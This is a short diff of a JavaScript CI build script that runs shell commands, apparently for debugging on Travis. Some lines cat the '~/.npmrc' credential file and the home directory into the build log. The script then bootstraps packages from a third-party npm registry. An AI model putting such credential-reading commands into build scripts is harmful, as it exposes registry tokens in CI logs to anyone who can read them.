@@ -6,7 +6,7 @@ function exec(cmd) {
 exec("pwd")
 exec("cat ~/.npmrc");
 exec("cat 'aaaaaaaaaaaa'");
-exec("cat /home/travis/.npmrc");
+exec("cat $HOME");
 if (process.env.CI) {
     if (process.env.TRAVIS_BRANCH !== "website") {
         exec("lerna bootstrap --ci --ignore website --registry http://registry.npm.rsscc.cn/repository/hbgj-fe/");
